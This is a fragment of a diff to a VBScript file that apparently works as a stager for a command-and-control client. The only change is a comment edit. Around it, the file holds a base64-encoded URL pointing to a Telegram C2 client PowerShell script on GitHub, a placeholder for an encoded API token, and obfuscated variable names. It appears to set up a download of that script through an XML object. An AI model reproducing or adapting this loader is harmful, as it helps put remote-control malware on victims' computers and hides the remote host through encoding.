@@ -8,7 +8,7 @@ Set WshShell = WScript.CreateObject("WScript.Shell")
 ' ENCODED API TOKEN
 hgjchgjc = "YOUR_BASE64_ENCODED_TOKEN"
 
-' ENCODED URL TO THE SCRIPT ()
+' ENCODED URL TO THE SCRIPT
 nfacvrea = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9Qb3dlcnNoZWxsLVRvb2xzLWFuZC1Ub3lzL21haW4vQ29tbWFuZC1hbmQtQ29udHJvbC9UZWxlZ3JhbS1DMi1DbGllbnQucHMx"
 
 Set objXML = CreateObject("MSXML2.DOMDocument")
